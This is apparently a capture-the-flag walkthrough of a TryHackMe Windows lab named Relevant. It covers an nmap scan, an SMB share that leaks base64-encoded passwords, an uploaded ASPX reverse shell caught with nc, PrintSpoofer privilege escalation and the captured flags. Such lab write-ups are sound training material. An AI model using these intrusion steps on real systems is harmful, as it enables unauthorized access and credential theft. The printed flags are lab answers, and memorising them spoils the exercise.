# Revenant

Room url: https://tryhackme.com/room/relevant

Windows Medium room 

Nmap Scan


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
└──╼ $nmap -sC -sV -oA nmap/relevant 10.10.51.178
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-01 00:38 IST
Nmap scan report for 10.10.51.178
Host is up (0.19s latency).
Not shown: 995 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows Server
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds  Windows Server 2016 Standard Evaluation 14393 microsoft-ds
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=Relevant
| Not valid before: 2023-05-30T13:35:51
|_Not valid after:  2023-11-29T13:35:51
|_ssl-date: 2023-05-31T13:39:54+00:00; -5h29m57s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: RELEVANT
|   NetBIOS_Domain_Name: RELEVANT
|   NetBIOS_Computer_Name: RELEVANT
|   DNS_Domain_Name: Relevant
|   DNS_Computer_Name: Relevant
|   Product_Version: 10.0.14393
|_  System_Time: 2023-05-31T13:39:15+00:00
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -4h05m57s, deviation: 3h07m50s, median: -5h29m57s
| smb2-time: 
|   date: 2023-05-31T13:39:14
|_  start_date: 2023-05-31T13:36:37
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard Evaluation 14393 (Windows Server 2016 Standard Evaluation 6.3)
|   Computer name: Relevant
|   NetBIOS computer name: RELEVANT\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2023-05-31T06:39:12-07:00

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 64.66 seconds
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~



connecting via smbclient


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
└──╼ $smbclient -L 10.10.51.178
Password for [WORKGROUP\user]:

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	nt4wrksv        Disk      
SMB1 disabled -- no workgroup available
┌─[user@parrot]─[~/Desktop/hacking/tryhackme/relevant]
└──╼ $smbclient //10.10.51.178/nt4wrksv
Password for [WORKGROUP\user]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sun Jul 26 03:16:04 2020
  ..                                  D        0  Sun Jul 26 03:16:04 2020
  passwords.txt                       A       98  Sat Jul 25 20:45:33 2020

		7735807 blocks of size 4096. 4936658 blocks available
smb: \> get password.txt
NT_STATUS_OBJECT_NAME_NOT_FOUND opening remote file \password.txt
smb: \> get passwords.txt .
Error opening local file .
smb: \> get passwords.txt password.txt
getting file \passwords.txt of size 98 as password.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


password.txt

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
└──╼ $cat password.txt 
[User Passwords - Encoded]
Qm9iIC0gIVBAJCRXMHJEITEyMw==
QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


base64 decoding will give 2 usernames and password
Bob - !P@$$W0rD!123
Bill - Juw4nnaM4n420696969!$$$


Checking `smbmap` to check permissions of all services

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
└──╼ $smbmap -H 10.10.51.178 -u bob -p '!P@$$W0rD!123'
[+] IP: 10.10.51.178:445	Name: 10.10.51.178                                      
        Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	IPC$                                              	READ ONLY	Remote IPC
	nt4wrksv                                          	READ, WRITE	
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


here `nt4wrksv` has READ, WRITE permission, we can abuse that

Now, it's time to get user.txt

1. get aspx shell from https://github.com/borjmz/aspx-reverse-shell
2. send that to smbclient via `put` command
3. Go to that url http://10.10.51.178:49663/nt4wrksv/shell.aspx and using `nc` we will get shell


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
C:\Users\Bob\Desktop>type user.txt
type user.txt
THM{fdk4ka34vk346ksxfr21tg789ktf45}
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Privilege Escalation
1. PrintSpoofer is vulnerability - https://github.com/dievus/printspoofer
2. upload using smbclient and run the exploit
3. `PrintSpoofer.exe -i -c cmd`


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
C:\Windows\system32>type c:\users\administrator\desktop\root.txt
type c:\users\administrator\desktop\root.txt
THM{1fk5kf469devly1gl320zafgl345pv}
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

